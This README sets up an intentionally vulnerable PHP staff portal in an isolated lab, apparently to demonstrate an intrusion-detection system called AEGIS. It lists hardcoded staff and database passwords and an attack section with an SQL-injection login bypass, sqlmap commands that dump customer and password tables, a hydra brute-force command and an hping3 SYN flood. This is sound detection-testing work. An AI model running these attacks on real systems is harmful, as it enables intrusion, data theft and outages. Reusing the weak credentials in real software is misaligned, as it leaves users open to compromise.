# company-web-server — Golden Myanmar Trading Staff Portal

**VM IP:** 10.10.10.10 (DMZ — VLAN 10)  
**Domain:** `http://goldenmyanmar.trading.com` (resolves via DNS at 10.10.10.20)  
**Stack:** Apache2 + PHP + MySQL (via hostname `db.goldenmyanmar.trading.com`)

---

## Deploy

```bash
# On company-web-server VM (10.10.10.10):

# 1. Install dependencies
sudo apt update
sudo apt install apache2 php php-mysqli libapache2-mod-php -y
sudo apt install libapache2-mod-security2 -y
sudo a2enmod security2
sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
sudo sed -i 's/SecRuleEngine DetectionOnly/SecRuleEngine On/' /etc/modsecurity/modsecurity.conf

# 2. Deploy web files
sudo cp -r lab/company-web-server/* /var/www/html/
sudo chown -R www-data:www-data /var/www/html/
sudo chmod -R 755 /var/www/html/

# 3. Open port 80
sudo ufw allow 80/tcp
sudo ufw reload

# 4. Restart Apache
sudo systemctl restart apache2
sudo systemctl enable apache2

# 5. Test
curl -s -o /dev/null -w "%{http_code}" http://10.10.10.10
# Expected: 200
```

---

## Database Setup

Run `setup.sql` on company-customer-db (10.20.20.10):

```bash
# From company-customer-db VM or aegis-company-admin via SSH:
mysql -h 10.20.20.10 -u root -p < lab/company-web-server/setup.sql

# Verify
mysql -h db.goldenmyanmar.trading.com -u gmuser -pgm1234 goldenmyanmardb \
  -e "SELECT COUNT(*) FROM customers;"
```

---

## Staff Login Credentials

| Username   | Password      | Role    |
|------------|---------------|---------|
| admin      | Admin@2024!   | admin   |
| manager01  | Manager#2024  | manager |
| teller01   | teller@123    | teller  |
| teller02   | pass1234      | teller  |

---

## Attack Demo Points

| Attack | Target | Tool | Expected AEGIS Alert |
|--------|--------|------|----------------------|
| SQLi login bypass | `index.php` login form | Manual / sqlmap | `web_attack (sqli)` |
| SQLi data dump | `customers.php?search=` | `sqlmap -u "http://10.10.10.10/customers.php?search=1" --dbs --dump` | `web_attack (sqli)` |
| Brute force login | `index.php` | `hydra -l admin -P rockyou.txt http-post-form` | `web_brute` → auto-block |
| DDoS / SYN flood | Port 80 | `hping3 -S --flood -p 80 10.10.10.10` | `ddos` → null-route + Telegram |
| Directory traversal | Apache paths | `nikto -h http://10.10.10.10` | `web_attack` |
| XSS | Form inputs | Burp Suite / manual | `web_attack` |

### SQLi Login Bypass (Manual Demo)
```
Username: ' OR '1'='1
Password: anything
→ Bypasses authentication — logs in as first staff row
```

### SQLi Data Exfiltration
```bash
sqlmap -u "http://10.10.10.10/customers.php?search=1" \
  --dbs --tables -D goldenmyanmardb --dump --batch
# Dumps: customers (NRC, email, phone), accounts (balance), staff (passwords)
```
